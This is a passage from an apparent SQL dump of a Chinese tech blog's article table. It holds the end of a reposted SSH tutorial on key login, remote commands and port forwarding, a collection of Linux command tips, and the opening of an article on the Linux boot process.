~/.ssh/id_rsa.pub的作用是，将本地的公钥文件~/.ssh/id_rsa.pub，重定向追加到远程文件authorized_keys的末尾。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">写入authorized_keys文件后，公钥登录的设置就完成了。</p><p><img src="http://image.beekka.com/blog/201112/bg2011122301.jpg" style="margin: 0px; padding: 0px; border: 0px rgb(51, 51, 51); font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; display: block; max-width: 100%;"/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">七、远程操作</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">SSH不仅可以用于远程主机登录，还可以直接在远程主机上执行操作。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">上一节的操作，就是一个例子：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh user@host &#39;mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">单引号中间的部分，表示在远程主机上执行的操作；后面的输入重定向，表示数据通过SSH传向远程主机。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这就是说，SSH可以在用户和远程主机之间，建立命令和数据的传输通道，因此很多事情都可以通过SSH来完成。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">下面看几个例子。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">将$HOME/src/目录下面的所有文件，复制到远程主机的$HOME/src/目录。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ cd &amp;&amp; tar czv src | ssh user@host &#39;tar xz&#39;</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">将远程主机$HOME/src/目录下面的所有文件，复制到用户的当前目录。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh user@host &#39;tar cz src&#39; | tar xzv</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">查看远程主机是否运行进程httpd。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh user@host &#39;ps ax | grep [h]ttpd&#39;</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">八、绑定本地端口</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">既然SSH可以传送数据，那么我们可以让那些不加密的网络连接，全部改走SSH连接，从而提高安全性。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">假定我们要让8080端口的数据，都通过SSH传向远程主机，命令就这样写：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh -D 8080 user@host</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">SSH会建立一个socket，去监听本地的8080端口。一旦有数据传向那个端口，就自动把它转移到SSH连接上面，发往远程主机。可以想象，如果8080端口原来是一个不加密端口，现在将变成一个加密端口。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">九、本地端口转发</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">有时，绑定本地端口还不够，还必须指定数据传送的目标主机，从而形成点对点的&quot;端口转发&quot;。为了区别后文的&quot;远程端口转发&quot;，我们把这种情况称为&quot;本地端口转发&quot;（Local forwarding）。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">假定host1是本地主机，host2是远程主机。由于种种原因，这两台主机之间无法连通。但是，另外还有一台host3，可以同时连通前面两台主机。因此，很自然的想法就是，通过host3，将host1连上host2。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">我们在host1执行下面的命令：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh -L 2121:host2:21 host3</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">命令中的L参数一共接受三个值，分别是&quot;本地端口:目标主机:目标主机端口&quot;，它们之间用冒号分隔。这条命令的意思，就是指定SSH绑定本地端口2121，然后指定host3将所有的数据，转发到目标主机host2的21端口（假定host2运行FTP，默认端口为21）。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这样一来，我们只要连接host1的2121端口，就等于连上了host2的21端口。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ftp localhost:2121</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">&quot;本地端口转发&quot;使得host1和host3之间仿佛形成一个数据传输的秘密隧道，因此又被称为&quot;SSH隧道&quot;。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">十、远程端口转发</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">既然&quot;本地端口转发&quot;是指绑定本地端口的转发，那么&quot;远程端口转发&quot;（remote forwarding）当然是指绑定远程端口的转发。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">还是接着看上面那个例子，host1与host2之间无法连通，必须借助host3转发。但是，特殊情况出现了，host3是一台内网机器，它可以连接外网的host1，但是反过来就不行，外网的host1连不上内网的host3。这时，&quot;本地端口转发&quot;就不能用了，怎么办？</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">解决办法是，既然host3可以连host1，那么就从host3上建立与host1的SSH连接，然后在host1上使用这条连接就可以了。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">我们在host3执行下面的命令：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh -R 2121:host2:21 host1</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">R参数也是接受三个值，分别是&quot;远程主机端口:目标主机:目标主机端口&quot;。这条命令的意思，就是让host1监听它自己的2121端口，然后将所有数据经由host3，转发到host2的21端口。由于对于host3来说，host1是远程主机，所以这种情况就被称为&quot;远程端口绑定&quot;。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">绑定之后，我们在host1就可以连接host2了：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ftp localhost:2121</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这里必须指出，&quot;远程端口转发&quot;的前提条件是，host1和host3两台主机都有sshD和ssh客户端。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">十一、SSH的其他参数</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">SSH还有一些别的参数，也值得介绍。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">N参数，表示只连接远程主机，不打开远程shell；T参数，表示不为这个连接分配TTY。这个两个参数可以放在一起用，代表这个SSH连接只用来传数据，不执行远程操作。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh -NT -D 8080 host</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">f参数，表示SSH连接成功后，转入后台运行。这样一来，你就可以在不中断SSH连接的情况下，在本地shell中执行其他操作。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh -f -D 8080 host</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">要关闭这个后台连接，就只有用kill命令去杀掉进程。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">十二、参考文献</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">　　* SSH, The Secure Shell: The Definitive Guide:&nbsp;<a href="http://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch02_04.htm" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">2.4. Authentication by Cryptographic Key</a>, O&#39;reilly</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">　　* SSH, The Secure Shell: The Definitive Guide:&nbsp;<a href="http://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch09_02.htm" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">9.2. Port Forwarding</a>, O&#39;reilly</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">　　* Shebang:&nbsp;<a href="http://shebang.brandonmintern.com/tips-for-remote-unix-work-ssh-screen-and-vnc" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">Tips for Remote Unix Work (SSH, screen, and VNC)</a></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">　　* brihatch:&nbsp;<a href="http://www.symantec.com/connect/articles/ssh-host-key-protection" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">SSH Host Key Protection</a></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">　　* brihatch:&nbsp;<a href="http://www.symantec.com/connect/articles/ssh-user-identities" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">SSH User Identities</a></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">　　* IBM developerWorks:&nbsp;<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">实战 SSH 端口转发</a></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">　　* Jianing YANG：<a href="http://blog.jianingy.com/2009/09/ssh%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">ssh隧道技术简介</a></p><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal; margin-bottom: 0px !important;">　　* WikiBooks:&nbsp;<a href="http://en.wikibooks.org/wiki/Internet_Technologies/SSH" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">Internet Technologies/SSH</a></p><p><br/></p><p><br/></p><p>原文:&nbsp;<a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html">http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html</a></p>', '本文转载自“阮一峰的网络日志”，将其中关于SSH的两篇文章合并为一篇，记录一下，很有用的文章。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/68dd5b2d9a280c19042ba933d34be2f1.jpg', 'mylxsw', '转载', 1, 0, 1407981761, NULL, NULL, 'html');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(367, 'Linux操作技巧收集', '本文收集了Linux系统使用中常用到的一些小技巧。\r\n\r\n####使用pushd和popd命令快速切换目录\r\n经常会有这么一种情况，我们会在不同目录中进行频繁的切换，如果目录很深，那么使用```cd```命令的工作量是不小的，这时可以使用```pushd```和```popd```命令快速切换目录。\r\n\r\n```shell\r\n$ pwd\r\n/Users/mylxsw/codes/php/lecloud/api\r\n$ pushd .\r\n~/codes/php/lecloud/api ~/codes/php/lecloud/api\r\n$ cd ../album/\r\n$ pwd\r\n/Users/mylxsw/codes/php/lecloud/album\r\n$ popd\r\n~/codes/php/lecloud/api\r\n$ pwd\r\n/Users/mylxsw/codes/php/lecloud/api\r\n```\r\n\r\n####创建软连接的时候出现```Too many levels of symbolic links```的错误信息   \r\n\r\n创建软连接的时候使用绝对路径就可以解决，不要使用相对路径。\r\n```shell\r\nlocalhost:~ mylxsw$ ln -s /Users/mylxsw/其它/app /Users/mylxsw/app\r\n```\r\n\r\n####使用SCP命令在服务器和本地计算机之间传递文件\r\n```shell\r\nusage: scp [-12346BCEpqrv] [-c cipher] [-F ssh_config] [-i identity_file]\r\n           [-l limit] [-o ssh_option] [-P port] [-S program]\r\n           [[user@]host1:]file1 ... [[user@]host2:]file2\r\n```\r\n\r\n从服务器下载文件\r\n    \r\n    scp username@服务器地址:/path/文件名 本地保存路径\r\n\r\n上传文件到服务器\r\n\r\n    scp 本地文件路径 username@服务器地址:/保存到服务器的路径\r\n\r\n> Tip: 如果要操作的对象是整个目录的话，需要添加`-t`参数。\r\n\r\n使用范例:\r\n\r\n```shell\r\nlocalhost:Downloads mylxsw$ scp guanyy@10.10.10.10:/home/guanyy/download.db ./\r\nguanyy@10.10.10.10''s password: \r\ndownload.db                                   100%   25MB  24.7MB/s   00:01 \r\n```\r\n\r\n####Mac OS 清理DNS缓存\r\n```shell\r\n dscacheutil -flushcache\r\n```\r\n\r\n####Cent OS服务器安装PHP的pecl\r\n想要安装某个PHP扩展，但发现服务器上没有pecl，因此需要安装pecl。\r\n```shell\r\n$ sudo yum install php-pear\r\n```\r\n安装pear之后，pecl就有了。\r\n\r\n####在当前目录下查找大小超过100MB的文件\r\n```shell\r\nfind . -type f -size +100M\r\n```\r\n\r\n####拷贝镜像到U盘\r\n```shell\r\ndd if=yourimage.img of=/dev/sdb1\r\n```\r\n\r\n####使用基于文本的图形界面配置命令setup\r\n安装setup命令\r\n```bash\r\n$ sudo yum install setuptool\r\n```\r\n\r\n安装之后，需要安装一些常见的系统配置组件，也是使用yum：\r\n```bash\r\n$ sudo yum install system-config-services system-config-firewall system-config-network-tui\r\n```\r\n\r\n更多的配置组件可以使用`yum search system-config`命令查看，进入配置界面直接使用`setup`命令。\r\n', '本文收集了Linux系统使用中常用到的一些小技巧。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/2ee9ae81a18573688aed964999620ac8.jpg', 'mylxsw', '原创', 1, 0, 1405648869, 1417160507, 0, 'markdown'),
(371, 'Linux 的启动流程', '<p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">作者：&nbsp;<a href="http://www.ruanyifeng.com/" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">阮一峰</a></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">半年前，我写了<a href="http://www.ruanyifeng.com/blog/2013/02/booting.html" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">《计算机是如何启动的？》</a>，探讨BIOS和主引导记录的作用。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">那篇文章不涉及操作系统，只与主板的板载程序有关。今天，我想接着往下写，探讨操作系统接管硬件以后发生的事情，也就是操作系统的启动流程。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p><img src="http://image.beekka.com/blog/201308/bg2013081701.png" style="margin: 0px; padding: 0px; border: 0px rgb(51, 51, 51); font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; display: block; max-width: 100%;"/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这个部分比较有意思。因为在BIOS阶段，计算机的行为基本上被写死了，程序员可以做的事情并不多；但是，一旦进入操作系统，程序员几乎可以定制所有方面。所以，这个部分与程序员的关系更密切。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">我主要关心的是Linux操作系统，它是目前服务器端的主流操作系统。下面的内容针对的是<a href="http://en.wikipedia.org/wiki/Debian" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">Debian</a>发行版，因为我对其他发行版不够熟悉。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">第一步、加载内核</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">操作系统接管硬件以后，首先读入 /boot 目录下的内核文件。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p><img src="http://image.beekka.com/blog/201308/bg2013081702.png" style="margin: 0px; padding: 0px; border: 0px rgb(51, 51, 51); font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; display: block; max-width: 100%;"/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">以我的电脑为例，/boot 目录下面大概是这样一些文件：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: 